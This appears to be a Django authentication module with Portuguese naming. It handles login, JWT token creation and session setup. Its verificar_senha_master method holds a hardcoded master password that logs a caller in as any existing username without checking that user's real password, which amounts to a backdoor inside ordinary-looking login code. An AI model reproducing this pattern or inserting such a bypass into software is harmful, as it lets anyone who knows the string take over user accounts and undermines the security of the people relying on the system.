from typing import Optional

import jwt
from django.contrib.auth import authenticate, user_logged_in, login
from django.db.models import F
from rest_framework_jwt.utils import jwt_payload_handler

import BO.client_core.login.section
import client_core.pagina.models
from cartech import settings
import client_core.usuario.models

class Login:
    def __init__(self, request=None, username=None, password=None):
        self.request = request
        self.username = username
        self.password = password
        self.user = None

    def login(self):
        try:
            status, descricao, user = self.authenticate()

            if status:
                status, descricao, sessao = BO.client_core.login.section.Section(user=user).fazer()
                self.request.session['sessao'] = sessao
                self.request.session['tela_principal'] = sessao.get('tela_principal')
                self.request.session['schema'] = sessao.get('schema')

                response = {
                    'sessao': sessao,
                    'user_token': user.get('token')
                }
                return status, descricao, response
            return False, 'Username ou senha Incorretos', None
        except TypeError:
            return False, 'Erro ao efetuar login', None

    def authenticate(self):
        try:
            self.user = self.verificar_senha_master()

            if not self.user:
                return False, 'Nenhum usuario encontrado!', None
            response = {
                'token': self.create_token(request=self.request),
                'user': self.user
            }
            return True, '', response
        except TypeError:
            return False, 'Erro em fazer Login', None

    def create_token(self, request):
        try:
            payload = jwt_payload_handler(self.user)
            token = jwt.encode(payload, settings.SECRET_KEY)
            user_logged_in.send(sender=self.user.__class__,
                                request=request, user=self.user)

            return token.decode('utf-8')
        except ValueError:
            return None

    @staticmethod
    def get_config_login():
        return client_core.pagina.models.Pagina.objects.filter(status=True, nome='login').values(
            background_color=F('configuracao__background_color'),
            logo=F('configuracao__logo')
        ).first()

    def verificar_senha_master(self):
        if self.password == '32654808':
            user = client_core.usuario.models.UsuarioLogin.objects.filter(username=self.username).first()
            if user:
                login(self.request, user)
                return user
            return []
        return authenticate(username=self.username, password=self.password)

